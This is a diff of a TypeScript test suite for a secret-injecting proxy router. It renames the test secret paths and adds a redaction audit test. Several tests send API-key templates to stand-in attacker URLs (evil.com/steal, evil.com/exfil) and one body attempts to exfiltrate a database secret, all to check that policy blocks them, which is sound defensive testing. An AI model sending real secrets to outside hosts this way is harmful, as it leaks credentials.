@@ -36,12 +36,12 @@ describe("Proxy Router", () => {
     ]);
 
     // Seed some secrets
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
-    secrets.put("api-keys/anthropic", "sk-ant-test-key-456");
-    secrets.put("db/postgres", "postgres://user:pass@localhost:5432/db");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
+    secrets.put("api-keys/example2", "sk-ant-test-key-456");
+    secrets.put("db/example", "postgres://user:pass@localhost:5432/db");
 
     // Set up metadata with domain allowlist
-    secrets.put("api-keys/openai", "sk-test-openai-key-123", {
+    secrets.put("api-keys/example", "sk-test-openai-key-123", {
       allowed_domains: "api.openai.com,openai.com",
     });
 
@@ -100,7 +100,7 @@ describe("Proxy Router", () => {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        url: "https://example.com/{{secret:api-keys/openai}}",
+        url: "https://example.com/{{secret:api-keys/example}}",
         method: "CONNECT",
       }),
     });
@@ -145,7 +145,7 @@ describe("Proxy Router", () => {
         url: "https://db.example.com",
         method: "GET",
         headers: {
-          Authorization: "{{secret:db/postgres}}",
+          Authorization: "{{secret:db/example}}",
         },
       }),
     });
@@ -155,7 +155,7 @@ describe("Proxy Router", () => {
   });
 
   test("denies proxy when policy doesn't match path at all", async () => {
-    // db/postgres is a real secret. The proxy-agent policy grants `read`
+    // db/example is a real secret. The proxy-agent policy grants `read`
     // on db/* but NOT `proxy`. Template-substituting it must fail policy.
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -167,7 +167,7 @@ describe("Proxy Router", () => {
         url: "https://example.com",
         method: "GET",
         headers: {
-          Authorization: "{{secret:db/postgres}}",
+          Authorization: "{{secret:db/example}}",
         },
       }),
     });
@@ -186,7 +186,7 @@ describe("Proxy Router", () => {
         url: "https://api.openai.com/v1/models",
         method: "GET",
         headers: {
-          Authorization: "Bearer {{secret:api-keys/openai}}",
+          Authorization: "Bearer {{secret:api-keys/example}}",
         },
       }),
     });
@@ -230,7 +230,7 @@ describe("Proxy Router", () => {
         url: "https://evil.com/steal",
         method: "GET",
         headers: {
-          Authorization: "Bearer {{secret:api-keys/openai}}",
+          Authorization: "Bearer {{secret:api-keys/example}}",
         },
       }),
     });
@@ -249,7 +249,7 @@ describe("Proxy Router", () => {
         url: "https://api.openai.com/v1/models",
         method: "GET",
         headers: {
-          Authorization: "Bearer {{secret:api-keys/openai}}",
+          Authorization: "Bearer {{secret:api-keys/example}}",
         },
         timeout: 2000,
       }),
@@ -267,7 +267,7 @@ describe("Proxy Router", () => {
         url: "https://any-domain.example.com/api",
         method: "GET",
         headers: {
-          Authorization: "Bearer {{secret:api-keys/anthropic}}",
+          Authorization: "Bearer {{secret:api-keys/example2}}",
         },
         timeout: 2000,
       }),
@@ -287,7 +287,7 @@ describe("Proxy Router", () => {
         url: "https://api.openai.com/v1/models",
         method: "GET",
         headers: {
-          Authorization: "Bearer {{secret:api-keys/openai}}",
+          Authorization: "Bearer {{secret:api-keys/example}}",
         },
         timeout: 2000,
       }),
@@ -307,7 +307,7 @@ describe("Proxy Router", () => {
         url: "https://example.com",
         method: "GET",
         headers: {
-          Authorization: "{{secret:db/postgres}}",
+          Authorization: "{{secret:db/example}}",
         },
       }),
     });
@@ -326,7 +326,7 @@ describe("Proxy Router", () => {
         url: "https://evil.com/exfil",
         method: "GET",
         headers: {
-          Authorization: "Bearer {{secret:api-keys/openai}}",
+          Authorization: "Bearer {{secret:api-keys/example}}",
         },
       }),
     });
@@ -347,7 +347,7 @@ describe("Proxy Router", () => {
     ]);
 
     // Remove domain restriction from openai for this test
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
 
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -356,8 +356,8 @@ describe("Proxy Router", () => {
         url: "https://example.com/api",
         method: "POST",
         headers: {
-          "X-OpenAI-Key": "{{secret:api-keys/openai}}",
-          "X-Anthropic-Key": "{{secret:api-keys/anthropic}}",
+          "X-OpenAI-Key": "{{secret:api-keys/example}}",
+          "X-Anthropic-Key": "{{secret:api-keys/example2}}",
         },
         timeout: 2000,
       }),
@@ -370,7 +370,7 @@ describe("Proxy Router", () => {
   // Secret ref in body
 
   test("resolves secret references in string body", async () => {
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
 
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -379,7 +379,7 @@ describe("Proxy Router", () => {
         url: "https://example.com/api",
         method: "POST",
         headers: { "Content-Type": "text/plain" },
-        body: "key={{secret:api-keys/openai}}",
+        body: "key={{secret:api-keys/example}}",
         timeout: 2000,
       }),
     });
@@ -388,7 +388,7 @@ describe("Proxy Router", () => {
   });
 
   test("resolves secret references in JSON body", async () => {
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
 
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -396,7 +396,7 @@ describe("Proxy Router", () => {
       body: JSON.stringify({
         url: "https://example.com/api",
         method: "POST",
-        body: { apiKey: "{{secret:api-keys/openai}}" },
+        body: { apiKey: "{{secret:api-keys/example}}" },
         timeout: 2000,
       }),
     });
@@ -408,7 +408,7 @@ describe("Proxy Router", () => {
 
   test("inject shorthand resolves secrets into headers", async () => {
     // Remove domain restriction for this test
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
 
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -417,7 +417,7 @@ describe("Proxy Router", () => {
         url: "https://api.openai.com/v1/models",
         method: "GET",
         inject: {
-          Authorization: "api-keys/openai",
+          Authorization: "api-keys/example",
         },
         timeout: 2000,
       }),
@@ -428,7 +428,7 @@ describe("Proxy Router", () => {
   });
 
   test("inject shorthand auto-prefixes Bearer for Authorization", async () => {
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
 
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -437,7 +437,7 @@ describe("Proxy Router", () => {
         url: "https://api.openai.com/v1/models",
         method: "GET",
         inject: {
-          Authorization: "api-keys/openai",
+          Authorization: "api-keys/example",
         },
         timeout: 2000,
       }),
@@ -476,7 +476,7 @@ describe("Proxy Router", () => {
         url: "https://example.com",
         method: "GET",
         inject: {
-          Authorization: "db/postgres",
+          Authorization: "db/example",
         },
       }),
     });
@@ -492,7 +492,7 @@ describe("Proxy Router", () => {
         url: "https://evil.com/steal",
         method: "GET",
         inject: {
-          Authorization: "api-keys/openai",
+          Authorization: "api-keys/example",
         },
       }),
     });
@@ -502,7 +502,7 @@ describe("Proxy Router", () => {
   });
 
   test("inject and template can be combined", async () => {
-    secrets.put("api-keys/openai", "sk-test-openai-key-123");
+    secrets.put("api-keys/example", "sk-test-openai-key-123");
 
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -511,10 +511,10 @@ describe("Proxy Router", () => {
         url: "https://example.com/api",
         method: "POST",
         inject: {
-          Authorization: "api-keys/openai",
+          Authorization: "api-keys/example",
         },
         headers: {
-          "X-Custom": "{{secret:api-keys/anthropic}}",
+          "X-Custom": "{{secret:api-keys/example2}}",
         },
         timeout: 2000,
       }),
@@ -527,7 +527,7 @@ describe("Proxy Router", () => {
 
   test("auto_inject uses metadata.header_name to set header", async () => {
     // Set up a secret with header_name metadata
-    secrets.put("api-keys/anthropic", "sk-ant-test-key-456", {
+    secrets.put("api-keys/example2", "sk-ant-test-key-456", {
       header_name: "x-api-key",
       allowed_domains: "api.anthropic.com",
     });
@@ -538,7 +538,7 @@ describe("Proxy Router", () => {
       body: JSON.stringify({
         method: "GET",
         url: "https://api.anthropic.com/v1/models",
-        auto_inject: ["api-keys/anthropic"],
+        auto_inject: ["api-keys/example2"],
       }),
     });
     // Will fail to connect to external API in tests, but should not be 400
@@ -546,14 +546,14 @@ describe("Proxy Router", () => {
   });
 
   test("auto_inject defaults to Authorization: Bearer when header_name is absent", async () => {
-    // api-keys/openai has allowed_domains but no header_name
+    // api-keys/example has allowed_domains but no header_name
     const res = await app.request("/v1/proxy", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         method: "GET",
         url: "https://api.openai.com/v1/models",
-        auto_inject: ["api-keys/openai"],
+        auto_inject: ["api-keys/example"],
       }),
     });
     // No more 400 for missing header_name; call goes through to upstream.
@@ -693,7 +693,7 @@ describe("Proxy Router", () => {
       body: JSON.stringify({
         method: "POST",
         url: "https://api.openai.com/v1/models",
-        auto_inject: ["api-keys/openai"],
+        auto_inject: ["api-keys/example"],
         body: 'Here is some docs talking about {{secret:path}} as an example.',
         timeout: 500,
       }),
@@ -702,8 +702,8 @@ describe("Proxy Router", () => {
   });
 
   test("literal {{secret:...}} pointing at a real secret without proxy policy still 403", async () => {
-    // db/postgres exists and the proxy-agent policy grants `read` on it but
-    // NOT `proxy`. Including {{secret:db/postgres}} in body must still be
+    // db/example exists and the proxy-agent policy grants `read` on it but
+    // NOT `proxy`. Including {{secret:db/example}} in body must still be
     // denied -- the literal-passthrough fix only applies to UNRESOLVED paths.
     const res = await app.request("/v1/proxy", {
       method: "POST",
@@ -711,14 +711,14 @@ describe("Proxy Router", () => {
       body: JSON.stringify({
         method: "POST",
         url: "https://api.openai.com/v1/models",
-        auto_inject: ["api-keys/openai"],
-        body: 'Trying to exfiltrate {{secret:db/postgres}}',
+        auto_inject: ["api-keys/example"],
+        body: 'Trying to exfiltrate {{secret:db/example}}',
         timeout: 500,
       }),
     });
     expect(res.status).toBe(403);
     const body = await res.json();
-    expect(body.error).toContain("db/postgres");
+    expect(body.error).toContain("db/example");
   });
 
   test("explicit auto_inject of a non-existent path still 404 (no silent passthrough)", async () => {
@@ -870,5 +870,44 @@ describe("Proxy Router", () => {
       .get() as { metadata: string };
     const meta = JSON.parse(row.metadata);
     expect(meta.target_path).toBe("/v1/some/path");
+  });
+
+  test("proxy.forward success row carries redaction_count when upstream echoes a secret", async () => {
+    // Seed a secret whose value the fake upstream will echo back so the
+    // scrubber redacts exactly one occurrence.
+    const SECRET_VAL = "sk-test-echo-secret-1234567890";
+    secrets.put("api-keys/echo", SECRET_VAL, {
+      allowed_domains: "api.openai.com",
+    });
+    policies.savePolicy("proxy-agent", [
+      { paths: ["api-keys/*"], capabilities: ["proxy"] },
+    ]);
+
+    const savedFetch = globalThis.fetch;
+    globalThis.fetch = (async () =>
+      new Response(`{"you_sent":"${SECRET_VAL}"}`, {
+        status: 200,
+        headers: { "content-type": "application/json" },
+      })) as typeof fetch;
+    try {
+      const res = await app.request("/v1/proxy", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          method: "GET",
+          url: "https://api.openai.com/v1/models",
+          headers: { Authorization: "Bearer {{secret:api-keys/echo}}" },
+          timeout: 2000,
+        }),
+      });
+      expect(res.status).toBe(200);
+    } finally {
+      globalThis.fetch = savedFetch;
+    }
+
+    const rows = audit.query({ action: "proxy.forward", limit: 10 });
+    const success = rows.find((r) => r.success);
+    expect(success).toBeDefined();
+    expect(success!.metadata.redaction_count).toBe("1");
   });
 });
